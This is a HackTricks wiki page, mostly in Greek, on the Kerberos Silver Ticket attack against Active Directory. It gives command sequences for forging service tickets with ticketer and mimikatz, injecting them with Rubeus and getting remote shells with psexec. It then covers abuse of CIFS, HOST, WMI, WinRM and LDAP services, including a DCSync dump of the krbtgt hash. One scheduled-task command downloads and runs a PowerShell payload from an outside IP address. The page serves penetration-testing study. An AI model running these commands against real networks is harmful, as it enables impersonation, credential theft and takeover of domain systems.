# Silver Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silver ticket

Η επίθεση **Silver Ticket** περιλαμβάνει την εκμετάλλευση των υπηρεσιών εισιτηρίων σε περιβάλλοντα Active Directory (AD). Αυτή η μέθοδος βασίζεται στην **απόκτηση του NTLM hash ενός λογαριασμού υπηρεσίας**, όπως ένας λογαριασμός υπολογιστή, για να κατασκευαστεί ένα εισιτήριο Ticket Granting Service (TGS). Με αυτό το πλαστό εισιτήριο, ένας επιτιθέμενος μπορεί να έχει πρόσβαση σε συγκεκριμένες υπηρεσίες στο δίκτυο, **υποδυόμενος οποιονδήποτε χρήστη**, συνήθως στοχεύοντας σε διοικητικά δικαιώματα. Τονίζεται ότι η χρήση κλειδιών AES για την κατασκευή εισιτηρίων είναι πιο ασφαλής και λιγότερο ανιχνεύσιμη.

Για την κατασκευή εισιτηρίων, χρησιμοποιούνται διάφορα εργαλεία ανάλογα με το λειτουργικό σύστημα:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Στα Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Η υπηρεσία CIFS επισημαίνεται ως κοινός στόχος για την πρόσβαση στο σύστημα αρχείων του θύματος, αλλά και άλλες υπηρεσίες όπως οι HOST και RPCSS μπορούν επίσης να εκμεταλλευτούν για εργασίες και ερωτήματα WMI.

## Διαθέσιμες Υπηρεσίες

| Τύπος Υπηρεσίας                            | Υπηρεσία Silver Tickets                                                  |
| ------------------------------------------ | ----------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                               |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Ανάλογα με το OS επίσης:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Σε ορισμένες περιπτώσεις μπορείτε απλώς να ζητήσετε: WINRM</p> |
| Προγραμματισμένα Καθήκοντα                | HOST                                                                  |
| Κοινή Χρήση Αρχείων Windows, επίσης psexec | CIFS                                                                  |
| Λειτουργίες LDAP, συμπεριλαμβανομένου του DCSync | LDAP                                                                  |
| Εργαλεία Διαχείρισης Απομακρυσμένου Διακομιστή Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                    |
| Χρυσά Εισιτήρια                            | krbtgt                                                                |

Χρησιμοποιώντας **Rubeus** μπορείτε να **ζητήσετε όλα** αυτά τα εισιτήρια χρησιμοποιώντας την παράμετρο:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### IDs Γεγονότων Silver Tickets

* 4624: Σύνδεση Λογαριασμού
* 4634: Αποσύνδεση Λογαριασμού
* 4672: Σύνδεση Διαχειριστή

## Κατάχρηση Εισιτηρίων Υπηρεσίας

Στα παρακάτω παραδείγματα ας φανταστούμε ότι το εισιτήριο ανακτάται υποδυόμενοι τον λογαριασμό διαχειριστή.

### CIFS

Με αυτό το εισιτήριο θα μπορείτε να έχετε πρόσβαση στους φακέλους `C$` και `ADMIN$` μέσω **SMB** (αν είναι εκτεθειμένοι) και να αντιγράψετε αρχεία σε ένα μέρος του απομακρυσμένου συστήματος αρχείων απλά κάνοντας κάτι όπως:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Θα μπορείτε επίσης να αποκτήσετε ένα shell μέσα στον υπολογιστή ή να εκτελέσετε αυθαίρετες εντολές χρησιμοποιώντας **psexec**:

{% content-ref url="../lateral-movement/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../lateral-movement/psexec-and-winexec.md)
{% endcontent-ref %}

### HOST

Με αυτή την άδεια μπορείτε να δημιουργήσετε προγραμματισμένα καθήκοντα σε απομακρυσμένους υπολογιστές και να εκτελέσετε αυθαίρετες εντολές:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Με αυτά τα εισιτήρια μπορείτε να **εκτελέσετε WMI στο σύστημα του θύματος**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Βρείτε **περισσότερες πληροφορίες σχετικά με το wmiexec** στην παρακάτω σελίδα:

{% content-ref url="../lateral-movement/wmiexec.md" %}
[wmiexec.md](../lateral-movement/wmiexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Με πρόσβαση winrm σε έναν υπολογιστή μπορείτε να **έχετε πρόσβαση σε αυτόν** και ακόμη και να αποκτήσετε ένα PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Ελέγξτε την παρακάτω σελίδα για να μάθετε **περισσότερους τρόπους σύνδεσης με έναν απομακρυσμένο υπολογιστή χρησιμοποιώντας winrm**:

{% content-ref url="../lateral-movement/winrm.md" %}
[winrm.md](../lateral-movement/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Σημειώστε ότι **το winrm πρέπει να είναι ενεργό και να ακούει** στον απομακρυσμένο υπολογιστή για να έχετε πρόσβαση σε αυτόν.
{% endhint %}

### LDAP

Με αυτό το προνόμιο μπορείτε να εξάγετε τη βάση δεδομένων του DC χρησιμοποιώντας **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Μάθετε περισσότερα για το DCSync** στην παρακάτω σελίδα:

## Αναφορές

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Συμβουλή bug bounty**: **εγγραφείτε** στο **Intigriti**, μια premium **πλατφόρμα bug bounty που δημιουργήθηκε από hackers, για hackers**! Ελάτε μαζί μας στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) σήμερα, και αρχίστε να κερδίζετε βραβεία έως **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Ελάτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
